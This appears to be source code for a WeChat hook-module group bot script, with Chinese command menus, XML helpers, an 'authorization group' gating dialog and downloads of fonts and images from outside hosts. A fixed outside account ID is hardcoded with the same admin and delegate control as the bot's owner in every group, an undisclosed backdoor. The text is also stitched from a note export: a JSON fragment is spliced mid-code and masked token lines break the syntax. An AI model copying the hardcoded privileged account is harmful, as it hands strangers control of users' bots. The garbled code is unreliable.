            Document document = builder.parse(new ByteArrayInputStream(text.getBytes("UTF-8")));
            return true;
        } catch (Exception e) {
            return false;
        }
}
public String getElementContent(String xmlString, String tagName) { //陌然
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        ByteArrayInputStream input = new ByteArrayInputStream(xmlString.getBytes("UTF-8"));
        Document document = builder.parse(input);
        NodeList elements = document.getElementsByTagName(tagName);
        if (elements.getLength() > 0) {
            return elements.item(0).getTextContent();
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
public String getElementAttribute(String xmlString, String tagName, String attributeName) {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document document = builder.parse(new ByteArrayInputStream(xmlString.getBytes("UTF-8")));
        Element element = (Element) document.getElementsByTagName(tagName).item(0);
        if (element != null) {
            return element.getAttribute(attributeName);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
public String getElementContent(String xmlString, String elementName, String tagName) {
    try {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document document = builder.parse(new InputSource(new StringReader(xmlString)));
        NodeList referMsgList = document.getElementsByTagName(elementName);
        if (referMsgList.getLength() > 0) {
            Node referMsgNode = referMsgList.item(0);
            NodeList contentList = referMsgNode.getChildNodes();
            for (int i = 0; i < contentList.getLength(); i++) {
                Node contentNode = contentList.item(i);
                if (contentNode.getNodeName().equalsIgnoreCase(tagName)) {
                    return contentNode.getTextContent();
                }
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return null;
}
if(!found) {
    final Activity ThisActivity = getActivity();
    ThisActivity.runOnUiThread(new Runnable() {
        public void run() {
            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
            alertDialogBuilder.setTitle(Html.fromHtml("<font color=\"red\">提示</font>"));
            TextView messageTextView = new TextView(ThisActivity);
            messageTextView.setText(Html.fromHtml("<font color=\"#E09C4F\">需要加微信授权群才能使用，请前往网站查看相关信息，也可以点击下方直接进中转群寻求帮助</font>"));
            messageTextView.setPadding(20, 20, 20, 20);
            messageTextView.setTextSize(20);
            alertDialogBuilder.setView(messageTextView);
            alertDialogBuilder.setPositiveButton(Html.fromHtml("<font color=\"#893BFF\">前往网站</font>"), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    String url = "https://flowus.cn/share/d012f566-9f00-4d96-99ef-af04f9d0e39e";
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    ThisActivity.startActivity(intent);
                }
            });
            alertDialogBuilder.setNegativeButton(Html.fromHtml("<font color=\"#893BFF\">前往中转群</font>"), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    String url = "https://work.weixin.qq.com/gm/649edb8d62baeeb2002d5f843769dbbc";
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    ThisActivity.startActivity(intent);
                }
            });
            AlertDialog alertDialog = alertDialogBuilder.create();
            alertDialog.setCanceledOnTouchOutside(false);
            alertDialog.show();
        }
    });
}
import Hook.JiuWu.Xp.tools.HostInfo;
public String getStatus(String qun,String key) {
    return "1".equals(取(qun,key))?"关闭"+key+"[√]":"开启"+key+"[×]";
}
public void 菜单(Object data) {
    String text=data.content;
    String qun=data.talker;
    String wxid=data.sendTalker;
    File 代管=new File(JavaPath+"/数据/"+qun+"/代管.txt");
    if(!代管.getParentFile().exists()) {
        代管.getParentFile().mkdirs();
        if(!代管.exists()) {
            代管.createNewFile();
        }
    }
    if(!取(qun,"智能回复").equals("1")||data.talkerType==0&&取("开关","智能回复").equals("1")) {
        if(mWxid.equals(wxid)||简读用户(代管,wxid)|| wxid.equals("wxid_tasn67ogsmw821")) {
            开关(data);
            代管(data);
        }
        if("1".equals(getString(qun,"艾特回复",""))) {
            艾特(data);
        }
        String 菜单限制=data.sendTalker;
        if("1".equals(取(qun,"菜单限制"))) {
            菜单限制=mWxid;
        }
         if (菜单限制.equals(wxid) || 简读用户(代管, wxid)|| wxid.equals("wxid_tasn67ogsmw821")) {
            总结(data);
            报时(data);
            简报(data);
            if("1".equals(getString(qun,"自动回复",""))) {
                回复2(data);
            }
            if("1".equals(getString(qun,"头像制作",""))) {
                头像(data);
            }
            if("1".equals(getString(qun,"作图系统",""))) {
                作图(data);
            }
            if("1".equals(getString(qun,"智能系统",""))) {
                智能(data);
            }
            if("1".equals(getString(qun,"音乐系统",""))) {
                音乐(data);
            }
            if("1".equals(getString(qun,"图片系统",""))) {
                图片(data);
            }
            if("1".equals(getString(qun,"搜索功能",""))) {
                搜索(data);
            }
            if("1".equals(getString(qun,"视频系统",""))) {
                视频(data);
            }
            if("1".equals(getString(qun,"词条系统",""))) {
                词条(data);
            }
            if("1".equals(getString(qun,"查询系统",""))) {
                查询(data);
            }
            if("1".equals(getString(qun,"解析系统",""))) {
                解析(data);
            }
            if("1".equals(getString(qun,"娱乐系统",""))) {
                娱乐(data);
            }
            if("1".equals(getString(qun,"站长系统",""))) {
                站长(data);
            }
            if(!"1".equals(取(qun,"菜单屏蔽"))) {
                String 菜单="菜单";
                if(!取("开关","菜单指令").equals("")) {
                    菜单=取("开关","菜单指令");
                }
                if("1".equals(getString("开关","简洁模式",""))) {
                    if(text.equals(菜单)) {
                        String c="☆音乐系统☆智能系统☆\n"
                                +"☆配置设置☆图片系统☆\n"
                                +"☆开关系统☆底部样式☆\n"
                                +"☆搜索功能☆开关设置☆\n"
                                +"☆版本信息☆第二菜单☆";
                        sendm(qun,c);
                   }
                   if(text.equals("第二菜单")) {
                       String c="☆自身撤回☆查询系统☆\n"
                                +"☆视频系统☆解析系统☆\n"
                                +"☆艾特回复☆进群欢迎☆\n"
                                +"☆发送模式☆词条系统☆\n"
                                +"☆每日简报☆第三菜单☆";
                       sendm(qun,c);
                   }
                   if(text.equals("第三菜单")) {
                       String c="☆整点报时☆站长系统☆\n"
                                +"☆娱乐系统☆代管系统☆\n"
                                +"☆作图系统☆自动回复☆\n"
                                +"☆头像制作☆环球时报☆\n"
                                +"☆每日总结☆敬请期待☆";
                       sendm(qun,c);
                   }
                } else {
                    if ("1".equals(getString("开关", "完整菜单", ""))) {
                        if (text.equals(菜单)) {
                            String c = "☆音乐系统☆智能系统☆\n"
                                    + "☆配置设置☆图片系统☆\n"
                                    + "☆开关系统☆底部样式☆\n"
                                    + "☆搜索功能☆开关设置☆\n"
                                    + "☆版本信息☆自身撤回☆\n"
                                    + "☆视频系统☆解析系统☆\n"
                                    + "☆艾特回复☆进群欢迎☆\n"
                                    + "☆发送模式☆词条系统☆\n"
                                    + "☆每日简报☆查询系统☆\n"
                                    + "☆整点报时☆站长系统☆\n"
                                    + "☆娱乐系统☆代管系统☆\n"
                                    + "☆作图系统☆自动回复☆\n"
                                    + "☆头像制作☆环球时报☆\n"
                                    + "☆每日总结☆敬请期待☆";
                            sendm(qun, c);
                        }
                    } else {
                        if (text.equals(菜单)) {
                            String c = "🍅词条系统☆图片系统🍅\n"
                                    + "🍅音乐系统☆作图系统🍅\n"
                                    + "🍅进群欢迎☆娱乐系统🍅\n"
                                    + "🍅解析系统☆搜索功能🍅";
                            sendm(qun, c);
                        }
                    }
                }
                if(text.equals("头像制作")) {
                    String f=getStatus(qun,text);
                    String c="☆引用+国庆头像1-18\n"
                            
+"☆引用+透明头像1-2\n"
                            +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("自动回复")) {
                    String f=getStatus(qun,text);
                    String c="☆添加精确回复 触发|回复\n"
                             +"☆添加模糊回复 触发|回复\n"
                             +"☆查看精确回复\n"
                             +"☆查看模糊回复\n"
                             +"☆清空精确回复\n"
                             +"☆清空模糊回复\n"
                             +"☆清空全部回复\n\n"
                             +"回复支持以下额外格式\n"
                             +"测试|[$€]\n"
                             +"$=图片/访问/语音\n"
                             +"€=链接/目录\n"
                             +"Tips:[访问≠目录]\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("作图系统")) {
                    String f=getStatus(qun,text);
                    String c="🍅文字表情包，命令加文字即可\n"
                    +"☆滚屏, 文字, 写作, 妹妹, 希望开心, 遇见你超级幸福, 爱人先爱己, 与你相遇, 别质疑我的爱, 小猪, 棉花, 时间会见证我的爱, 爱没有方向, 我的爱只给, 我的不败之神, 彩色瓶, 金榜题名, 新年快乐, 爱坚不可摧, 以爱之名留在身边, 搜图, 罗永浩说, 鲁迅说, 意见, 气泡, 小人, 悲报, 举牌, 猫举牌, 瓶, 结婚证, 情侣协议书, 表白, 萌妹举牌, 唐可可举牌, 大鸭举牌, 猫猫举牌, 虹夏举牌, 抖音文字, 狂粉, 流萤举牌, 快跑,谷歌, 喜报, 记仇, 低语, 诺基亚, 顶尖,不喊我, 别说了, 一巴掌, 许愿失败, 二次元\n"
                             +"🍅普通表情包，引用或者单独发都可以\n"
                             +"☆随机, 出征, 透明, 头像, 一直, 老婆, 丢, 陪睡, 捣药, 咬, 摸摸, 亲亲, 吃下, 拍拍, 需要, 加个框, 膜拜, 黑白, 扭, 呼啦圈, 比心, 大摇大摆, 可乐, 打球, 挠头, 踢你, 爱心, 快溜,  摇, 很拽, 出街, 生气, 按脚,威胁, 发怒, 添乱, 上瘾, 一样, 我永远喜欢, 防诱拐, 拍头（可加文字）, 鼓掌, 问问, 继续干活, 悲报, 啃, 高血压, 波奇手稿, 奶茶, 画, 撕, 蹭, 炖, 撞,  字符画, 追列车, 国旗, 鼠鼠搓, 小丑, 迷惑, 兑换券, 捂脸, 爬, 群青, 白天黑夜, 像样的亲亲, 入典, 恐龙, 注意力涣散, 离婚协议, 狗都不玩, 管人痴, 不要靠近, 别碰, 吃, 意若思镜, 灰飞烟灭, 闭嘴, 我打宿傩, 满脑子, 闪瞎, 红温, 关注, 哈哈镜, 垃圾, 原神吃, 原神启动, 鬼畜, 手枪, 锤, 打穿, 抱紧, 抱大腿, 胡桃啃, 不文明, 采访, 杰瑞盯, 急急国王, 啾啾, 跳, 万花筒, 凯露指, 远离, 踢球, 卡比锤, 敲, 泉此方看, 偷学, 左右横跳, 让我进去, 舔糖, 等价无穷小, 听音乐, 小天使, 加载中, 看扁, 看图标, 循环, 寻狗启事, 永远爱你, 真寻看书, 旅行伙伴觉醒, 旅行伙伴加入, 交个朋友（可加文字）, 结婚申请, 流星, 米哈游, 上香, 我老婆, 纳西妲啃, 亚文化取名机, 无响应, 请假条, 我推的网友, out, 加班, 这像画吗, 小画家, 推锅, 完美, 捏, 像素化, 顶, 玩游戏, 一起玩, 出警, 警察, 土豆, 捣, 打印, 舔, 棒子, 弹, 难办, 是他, 面具, 扔瓶子, 摇一摇, 黑神话\n"
                            
                             +"🍅两个人的表情包，引用使用\n"
                             +"☆揍,  亲亲, 白天晚上, 舰长, 请拨打, 击剑, 抱抱, 贴贴, 佩佩举\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("站长系统")) {
                    String f=getStatus(qun,text);
                    String c="☆访问+链接\n"
                             +"☆下载+链接\n"
                             +"☆JSON+数据\n"
                             +"☆重定向+链接\n"
                             +"☆网站截图+链接\n"
                             +"☆文件转链接+目录\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("代管系统")) {
                    String c="☆引用+添加代管\n"
                             +"☆引用+删除代管\n"
                             +"☆代管列表\n"
                             +"☆清空代管";
                    sendm(qun,c);
                }
                if(text.equals("娱乐系统")) {
                    String f=getStatus(qun,text);
                    String c="☆签到\n"
   
+"☆签到排行\n"
                        +"☆开启/关闭"+f;
                    sendm(qun,c);
                }
                
if(text.equals("解析系统")) {
                    
String f=getStatus(qun,text);
                    
String c="☆引用解析\n"
                                                 
+"☆发链接自动解析\n"
                          
  +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("查询系统")) {
                    String f=getStatus(qun,text);
                    String c="☆天气+地区\n"
                             +"☆百科+内容\n"
                             +"☆今日油价+省级\n"
                             +"☆菜谱查询+名称\n"
                             +"☆宠物查询+名称\n"
                             +"☆王者战力+英雄\n"
                             +"☆扩展名查询+名称\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("词条系统")) {
                    String f=getStatus(qun,text);
                    String c="☆疯狂星期四☆毒鸡汤☆\n"
                             +"☆朋友圈文案☆彩虹屁☆\n"
                             +"☆动画文案☆漫画文案☆\n"
                             +"☆游戏文案☆文学文案☆\n"
                             +"☆原创文案☆网络文案☆\n"
                             +"☆其他文案☆影视文案☆\n"
                             +"☆诗词文案☆哲学文案☆\n"
                             +"☆网易文案☆机灵文案☆\n"
                             +"☆舔狗日记☆\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("发送模式")) {
                    String 发送模式="文字";
                    if("1".equals(取("开关","发送模式"))) {
                        发送模式="图片";
                    } else if("2".equals(取("开关","发送模式"))) {
                        发送模式="卡片";
                    }
                    String 简洁模式="×";
                    if("1".equals(getString("开关","简洁模式",""))) {
                        简洁模式="√";
                    }
                    String c="当前模式是["+发送模式+"]发送\n"
                             +"☆切换文字发送\n"
                             +"☆切换图片发送\n"
                             +"☆切换卡片发送\n"
                             +"☆开启/关闭简洁模式["+简洁模式+"]";
                    sendm(qun,c);
                }
                if(text.equals("艾特回复")) {
                    String f=getStatus(qun,text);
                    String 回复类型="内容";
                    if("1".equals(getString(qun,"回复类型",""))) {
                        回复类型="智能";
                    }
                    String c="☆设置回复+内容\n"
                             +"☆重置回复内容\n"
                             +"☆查看回复内容\n"
                             +"☆查看回复变量\n\n"
                             +"当前模式是["+回复类型+"]回复\n"
                             +"☆切换内容回复\n"
                             +"☆切换智能回复\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("进群欢迎")) {
                    String f=getStatus(qun,text);
                    String c="☆进群音乐卡片欢迎\n"
                      +"☆无需设置\n"
                            +"☆"+f;
                    sendm(qun,c);
                }
                    if(text.equals("整点报时")) {
                        String f=getStatus(qun,text);
                        String c="☆报时\n"
                                 +"整点自动发送播报\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                    if(text.equals("每日简报")) {
                        String f=getStatus(qun,text);
                        String c="☆简报\n"
                                 +"早上九点自动发送\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                    if(text.equals("每日总结")) {
                        String f=getStatus(qun,text);
                        String c="☆一键总结\n"
                                 +"☆追问+问题\n"
                                 +"☆清空总结内容\n"
                                 +"需要绑定智能系统\n"
                                 +"晚上八点自动总结\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                    if(text.equals("环球时报")) {
                        String f=getStatus(qun,text);
                        String c="早上九点自动发送\n"
                                 +"目前仅支持群使用\n"
                                 +"☆"+f;
                        sendm(qun,c);
                    }
                if(text.equals("视频系统")) {
                    String f=getStatus(qun,text);
                    String c="☆详见视频菜单\n"
                            +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("自身撤回")) {
                    String f=getStatus(qun,text);
                    int 撤回时间=30;
                    if(getInt(qun,"撤回时间",0)!=null) {
                        撤回时间=getInt(qun,"撤回时间",30);
                    }
                    String c="☆设置撤回时间+数字\n"
                             +"当前撤回时间:"+撤回时间+"秒\n"
                             +"时间不得超过110秒\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("版本信息")) {
                    String version=yun.optString("version");
                    File folder=new File(JavaPath);
                    long 结束加载=data.createTime;
                    String formattedSize=getFormattedSize(folder);
                    String c="脚本昵称:"+脚本名称+"\n"
                             +"脚本作者:"+脚本作者+"\n"
                             +"最新版本:"+version+"\n"
                             +"当前版本:"+当前版本+"\n"
                             +"微信版本:"+VersionName(mContext)+"("+VersionCode(mContext)+")\n"
                             +"模块版本:"+VersionName(HostInfo.getModuleContext())+"\n"
                             +"账号昵称:"+getName(mWxid)+"\n"
                             +"目录大小:"+formattedSize+"\n"
                             +"运行时长:"+formatTime((float)(结束加载-开始加载))+"\n"
                             +"更新时间:"+更新时间;
                    sendm(qun,c);
                }
                if(text.equals("搜索功能")) {
                    String f=getStatus(qun,text);
                    String c="☆搜图+内容\n"
                             +"☆看电影、搜电影+名称\n"
                             +"☆搜索内容+内容\n"
                             +"☆搜索影视、图片、内容、应用+内容\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("音乐系统")) {
                    String f=getStatus(qun,text);
                    String c="☆❥单点歌曲\n"
                            
+"☆听歌、放首、 想听、唱歌、 来首、语音、红包+歌名\n"
   
+"☆QQ音乐:Q歌名、网易音乐:Y歌名、Joox音乐:J歌名、抖音音乐:D+歌名、酷我音乐:W+歌名、波点音乐:B+歌名、咪咕音乐:M+歌名、千千音乐:91+歌名\n"
                                            
+"☆❥转语音\n"
                            
+"☆音色（查看音色列表）、转、说、yy+文字（或引用文字）, 支付宝 +数字\n"
                            
+"☆❥语音包\n"

+"☆唱鸭、唱歌、上dj、男生、女生、御姐、绿茶、怼人、御姐音、可爱、怼人音、绿茶音、来财、随机音乐、dj+数量、坤坤+数量\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("图片系统")) {
                    String f=getStatus(qun,text);
                    String c="☆❥图片功能☆\n"
                            
+"☆小狐狸, 七濑胡桃, 方形头像, 原神竖图, 签到, 坤坤, 摸鱼人,萌版竖图, 移动竖图, 原神横图, 白底横图, 风景横图, 萌版横图, PC横图, 早安, 美女, 猫咪图, 买家秀, 兽猫酱, 帅哥图, 小清新, 动漫图, 看汽车, 看炫酷, 风景, 腹肌, 萌宠图, 原神图, 黑丝, 白丝, 60s, 日报, 图集, 原神图片, 绘画, 表情包, 头像, 图文素材, 二次元, 一图, 领老婆, 求婚, 感动☆\n"
                            
+"☆❥图片搜索☆\n"
                            
+"☆搜图, 搜表情, 地铁, 天气, 搜壁纸+关键词☆\n"

+"☆❥图片生成☆\n"
                            
+"☆合成,生成, 手写☆\n"
      
+"☆❥AI功能☆\n"
                            
+"☆回复+问题☆\n"
                             +"☆"+f;
                    sendm(qun,c);
                }
                if(text.equals("开关系统")) {
                    String f0=getStatus(qun,"环球时报");
                    String f1=getStatus(qun,"头像制作");
                    String f2=getStatus(qun,"自动回复");
                    String f3=getStatus(qun,"作图系统");
                    String f4=getStatus(qun,"站长系统");
                    String f5=getStatus(qun,"热搜系统");
                    String f6=getStatus(qun,"娱乐系统");
                    String f7=getStatus(qun,"每日简报");
                    String f8=getStatus(qun,"整点报时");
                    String f9=getStatus(qun,"解析系统");
                    String f10=getStatus(qun,"查询系统");
                    String f11=getStatus(qun,"音乐系统");
                    String f12=getStatus(qun,"图片系统");
                    String f13=getStatus(qun,"智能系统");
                    String f14=getStatus(qun,"搜索功能");
                    String f15=getStatus(qun,"自身撤回");
                    String f16=getStatus(qun,"视频系统");
                    String f17=getStatus(qun,"艾特回复");
                    String f18=getStatus(qun,"词条系统");
                    String f19=getStatus(qun,"菜单限制");
                    String f20=getStatus(qun,"菜单屏蔽");
                    String f21=getStatus(qun,"进群欢迎");
                    String f22=getStatus(qun,"每日总结");
                    String c="☆"+f0+"\n"
                             +"☆"+f1+"\n"
                             +"☆"+f2+"\n"
                             +"☆"+f3+"\n"
                             +"☆"+f4+"\n"
                             +"☆"+f5+"\n"
                             +"☆"+f6+"\n"
                             +"☆"+f7+"\n"
                             +"☆"+f8+"\n"
                             +"☆"+f9+"\n"
                             +"☆"+f10+"\n"
                             +"☆"+f11+"\n"
                             +"☆"+f12+"\n"
                             +"☆"+f13+"\n"
                             +"☆"+f14+"\n"
                             +"☆"+f15+"\n"
                             +"☆"+f16+"\n"
                             +"☆"+f17+"\n"
                             +"☆"+f18+"\n"
                             +"☆"+f19+"\n"
                             +"☆"+f20+"\n"
                             +"☆"+f21+"\n"
                             +"☆"+f22+"\n"
                             +"☆开启/关闭全部功能\n"
                             +"☆所有群设置";
                    sendm(qun,c);
                }
                if(text.equals("底部样式")) {
                    String 底部时间="×";
                    String 底部文案="×";
                    String 底部尾巴="×";
                    if("1".equals(getString("开关","底部时间",""))) {
                        底部时间="√";
                    }
                    if("1".equals(getString("开关","底部文案",""))) {
                        底部文案="√";
                    }
                    if("1".equals(getString("开关","底部尾巴",""))) {
                        底部尾巴="√";
                    }
                    String c="☆开启/关闭底部时间["+底部时间+"]\n"
                             +"☆开启/关闭底部文案["+底部文案+"]\n"
                             +"☆开启/关闭底部尾巴["+底部尾巴+"]\n"
                             +"☆设置底部内容+内容";
                    sendm(qun,c);
                }
                if(text.equals("智能系统")) {
                    String f=getStatus(qun,text);
                    String Token= "**********"
                    String 手机号码="已绑定";
                    String 智能回复="";
                    if(取("开关","accessToken").equals("")) {
                        Token= "**********"
                    }
                    if(取("开关","手机号码").equals("")) {
                        手机号码="未绑定";
                    }
                    if(data.isText()&&data.talkerType==0) {
                        智能回复=" -------------------------\n"
                                     +"☆开启/关闭智能回复\n"
                                     +"开启后消息将会用AI回复\n"
                                     +"并且其他功能将无法使用\n"
                                     +" -------------------------\n";
                    }
                    String c="☆AI+问题\n"
                             +"☆重新绑定\n"
                             +"☆重置对话\n"
                             +"☆我的智能体\n"
                             +"☆搜索智能体+内容\n"
                             +"☆查看智能体\n"
                             +"☆重置智能体\n"
                             +智能回复
                             +"发送[配置设置]绑定手机号\n"
                             +"☆手机状态:"+手机号码+"\n"
                             +"☆获取验证码\n"
                             +"然后发送[验证码]即可绑定\n"
                             +"☆清除绑定状态\n"
                             +"☆绑定状态: "**********"
                             +"☆"+f;
                    sendm(qun,c);
                }
            }
        }
    }
}","backgroundColor":"","textColor":"","data":{"format":{"language":"Java"},"segments":[{"text":"public static double ParseString(String version) {
    String[] parts = version.split("\\.");
    double result = 0;
    for (int i = 0; i < parts.length; i++) {
        String numericPart = parts[i].replaceAll("[^0-9]", "");
        if (!numericPart.isEmpty()) {
            int value = Integer.parseInt(numericPart);
            result += value * Math.pow(10, (parts.length - i - 1));
        }
    }
    return result;
}

public int getDuration(String source) {
    MediaMetadataRetriever retriever=new MediaMetadataRetriever();
    try {
        if(isUrl(source)) {
            URL url=new URL(source);
            retriever.setDataSource(url.toString());
        } else if(isFilePath(source)) {
            retriever.setDataSource(source);
        } else {
            return 1;
        }
        String time=retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
        return Integer.parseInt(time);
    } catch (Exception e) {
        e.printStackTrace();
        return 1;
    }
}
public static void SendReply(long msgId, String qun, String text) {
    double version=ParseString(VersionName(HostInfo.getModuleContext()));
    double ber=ParseString("3.5.5");
    if(version>=ber) {
        sendReply(msgId,qun,text);
    } else {
        sendTextCard(qun,text);
    }
}
public static String multi(String str) {
    String result=post("https://suo.yt/short","longUrl="+str+"&shortKey=");
    try {
        JSONObject json=new JSONObject(result);
        Integer status=json.getInt("Code");
        if(status==1) {
            String url=json.getString("ShortUrl");
            return url;
        }
        return str;
    } catch (Throwable th) {
        return str;
    }
}
public static long timeUntilNext(int unit, int type) {
    LocalDateTime now=LocalDateTime.now();
    LocalDateTime targetTime;
    switch (unit) {
    case 1: // 周//剩天
        targetTime=now.withHour(0).withMinute(0).withSecond(0).withNano(0).plusWeeks(1);
        break;
    case 2: // 天/剩时
        targetTime=now.withHour(0).withMinute(0).withSecond(0).withNano(0).plusDays(1);
        break;
    case 3: // 时/剩分
        targetTime=now.withMinute(0).withSecond(0).withNano(0).plusHours(1);
        break;
    case 4: // 分/剩秒
        targetTime=now.withSecond(0).withNano(0).plusMinutes(1);
        break;
    default:
        targetTime=now.withSecond(0).withNano(0).plusMinutes(1);
    }
    Duration duration=Duration.between(now, targetTime);
    switch (type) {
    case 1: // 周/剩天
        return duration.toDays()/7;
    case 2: // 天/剩时
        return duration.toHours();
    case 3: // 时/剩分
        return duration.toMinutes();
    case 4: // 分/剩秒
        return duration.getSeconds();
    default:
        return duration.getSeconds();
    }
}
public static String VersionName(Context context) {
    try {
        return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
    } catch (Exception e) {
        e.printStackTrace();
        return "";
    }
}
public static int VersionCode(Context context) {
    try {
        return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
    } catch (Exception e) {
        e.printStackTrace();
        return -1;
    }
}
public static String AudioToSilk(String url) {
    if(!url.contains(".silk")) {
        String result=post("https://www.yx520.ltd/API/silk/api.php","url="+URLEncoder.encode(url,"UTF-8"));
        try {
            JSONObject json=new JSONObject(result);
            Integer code=json.getInt("code");
            if(code==1) {
                String message=json.getString("message");
                return message;
            } else {
                return "";
            }
        } catch(e) {
            return "";
        }
    }
    return url;
}
public static String formatTime(float time) {
    String suffix="豪秒";
    long seconds=(long)(time/1000);
    String tr=seconds/3600+"时"+(seconds%3600)/60+"分"+seconds%3600%60%60+"秒";
    tr=tr.replace("分0秒","分");
    tr=tr.replace("时0分","时");
    tr=tr.replace("0时","");
    return tr;
}
public static HashMap 地图=new HashMap();
public class 检查 {
    String 名称;
    JSONArray 数组;
    JSONArray 数据=new JSONArray();
    long 时间;
    int 数量;
}
Activity ThisActivity = null;
public void initActivity() {
    ThisActivity = getActivity();
}
public void ts(String Title, String Content) {
    initActivity();
    ThisActivity.runOnUiThread(new Runnable() {
        public void run() {
            AlertDialog alertDialog = new AlertDialog.Builder(ThisActivity,AlertDialog.THEME_DEVICE_DEFAULT_LIGHT).create();
            alertDialog.setTitle(Title);
            alertDialog.setMessage(Content);
            alertDialog.setCancelable(false);
            alertDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "确定", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {}
            });
            alertDialog.show();
        }
    });
}
public class CustomToast {
    private static Toast toast;
    private static Handler handler = new Handler(Looper.getMainLooper());
    public static void a(Context context,String str) {
        handler.post(new Runnable() {
            public void run() {
                if (toast != null) {
                    toast.cancel();
                }
                TextView textView = new TextView(context);
                textView.setBackground(n4("#181818", "#FFFFFF", 0, 10)); // 设置背景
                textView.setPadding(30, 30, 30, 30);
                textView.setTextColor(android.graphics.Color.WHITE); // 设置文本颜色为白色
                textView.setGravity(Gravity.CENTER); // 设置文本居中
                textView.setText("[PLCNB]\n" + str); // 设置文本内容
                toast = new Toast(context.getApplicationContext());
                toast.setGravity(Gravity.CENTER, 0, 0); // 设置Toast显示位置为屏幕中央
                toast.setDuration(Toast.LENGTH_LONG); // 设置Toast显示时长
                toast.setView(textView); // 设置Toast的视图
                toast.show(); // 显示Toast
            }
        });
    }
    public static android.graphics.drawable.GradientDrawable n4(String str, String str2, int i, int i2) {
        android.graphics.drawable.GradientDrawable gradientDrawable = new android.graphics.drawable.GradientDrawable();
        gradientDrawable.setColor(android.graphics.Color.parseColor(str));
        gradientDrawable.setStroke(i, android.graphics.Color.parseColor(str2));
        gradientDrawable.setCornerRadius(i2);
        gradientDrawable.setAlpha(130);
        gradientDrawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE); // 设置形状为矩形
        return gradientDrawable;
    }
}
public static String FileFormatConversion(long sizeInBytes) {
    double sizeInKB=sizeInBytes / 1024.0; // 文件夹大小（KB）
    DecimalFormat decimalFormat=new DecimalFormat("#.###");
    if (sizeInKB < 1024) {
        return decimalFormat.format(sizeInKB) + "KB";
    } else if (sizeInKB < 1024 * 1024) {
        double sizeInMB=sizeInKB / 1024.0; // 文件夹大小（MB）
        return decimalFormat.format(sizeInMB) + "MB";
    } else {
        double sizeInGB=sizeInKB / (1024.0 * 1024.0); // 文件夹大小（GB）
        return decimalFormat.format(sizeInGB) + "GB";
    }
}
int 选择=0;
public void 存(String a,String b,String c) {
    putString(a,b,c);
}
public String 取(String a,String b) {
    return getString(a,b,"");
}
public static long getDirectorySize(File dir) {
    if (dir == null || !dir.isDirectory()) {
       return 0;
    }
    long size = 0;
    File[] files = dir.listFiles();
    if (files != null) {
        for (File file : files) {
            if (file.isFile()) {
                size += file.length();
            } else if (file.isDirectory()) {
                 size += getDirectorySize(file); // 递归调用
            }
        }
    }
    return size;
}
boolean flag=false;
public List list=new ArrayList();
public static void DetectPic() {
    try {
        File dir = new File(JavaPath+"/数据/底图/");
        if(!dir.exists()||getDirectorySize(dir)==0) {
            dir.mkdirs();
            Downloadpic(-1);
        } else {
            for(int i=0; i<10; i++) {
                String fi=JavaPath+"/数据/底图/底图"+i+".jpg";
                File di = new File(fi);
                if(!di.exists()) {
                    Downloadpic(i);
                    if(list.contains(fi)) {
                        list.remove(fi);
                    }
                }
            }
        }
    } catch(Exception e) {
        e.printStackTrace();
    }
}
public static void Downloadpic(int j) {
    String url="https://api.miaomc.cn/image/get";
    if(j==-1) {
        flag=true;
        CustomToast.a(mContext,"底图正在缓存,请稍后");
        for(int i=0; i<10; i++) {
            try {
                xz(url,JavaPath+"/数据/底图/底图"+i+".jpg");
                if(i==9) {
                    flag=false;
                    CustomToast.a(mContext,"底图缓存成功");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    } else {
        try {
            xz(url,JavaPath+"/数据/底图/底图"+j+".jpg");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
public static void getData(String qun,String text) {
    if(flag) {
        sendMsg(qun,text);
        CustomToast.a(mContext,"底图缓存中，暂时切换文字发送");
        return;
    }
    String textface=JavaPath+"/数据/字体.ttf";
    File ff=new File(textface);
    if(!ff.exists()) {
        String url="https://sfile.chatglm.cn/chatglm4/b55e86e7-3343-443c-a73d-36640717c9cf.ttf";
        sendMsg(qun,text);
        CustomToast.a(mContext,"字体下载中，暂时切换文字发送");
        xz(url,textface);
